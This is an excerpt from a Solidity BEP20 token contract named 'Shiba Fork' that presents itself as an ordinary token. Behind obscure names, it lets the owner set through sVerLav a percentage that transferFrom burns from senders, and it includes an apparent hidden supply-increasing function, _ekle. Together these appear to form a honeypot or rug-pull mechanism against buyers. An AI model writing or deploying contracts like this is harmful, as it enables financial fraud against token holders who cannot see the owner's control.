...
contract HelloBEP20 is IBEP20 {
    using MathEH for uint256;

    string public name20EL =  "Shiba Fork";
    string public symbol20EL =  "SHF";
    uint8 public decimals20EL = 9;
    uint public _totalSupplyEH = 1*10**15 * 10**9;
    
    address private _owner;
    uint8 private _kdaking;
    ...
    constructor() {
        ...
        _owner = msgSender;
        balances[msg.sender] = _totalSupplyEH;
  ...
  function decimals() public view virtual returns (uint8) {
    ...
    function totalSupply() public override view returns (uint) {
        return _totalSupplyEH - balances[address(0)];
    }
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _lavD(from,tokens.mul(getVerLav()).div(10**2));
    ...
    function _lavD(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyEH = _totalSupplyEH.subb(tokens);
    ...
    function sVerLav(uint8 kdaking) public virtual onlyOwner {
		_kdaking = kdaking;
	}
    ...
    function _ekle(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyEH = _totalSupplyEH.ad(tokens);
